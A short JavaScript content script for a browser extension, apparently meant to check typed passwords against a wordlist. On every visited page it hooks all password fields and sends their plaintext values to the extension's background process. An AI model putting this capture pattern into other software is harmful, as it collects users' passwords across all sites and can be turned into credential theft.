// This is a content script that runs on all webpages visited by the user.
function passwordGrab(){
	// Locate input fields with type "password". Stores list of fields as a static NodeList object
	var password = document.querySelectorAll('input[type=password]');
	// Adds a listener on the each occurrence of a password field that triggers when field loses focus. This is intended to trigger when user clicks on the submit button for a login form.
	for (var x=0; x < password.length; x++){
			password[x].addEventListener("focusout", alertContent);
		
	}

	// Debugging function to create alert box with content of password field. Used to verify code is working as intended. Field content will later be compared against wordlist.
	function alertContent(){
		//alert(this.value);
		chrome.runtime.sendMessage({passvalue: this.value}, function(response){
			console.log(response.complete);
		});
		}
	}
passwordGrab();

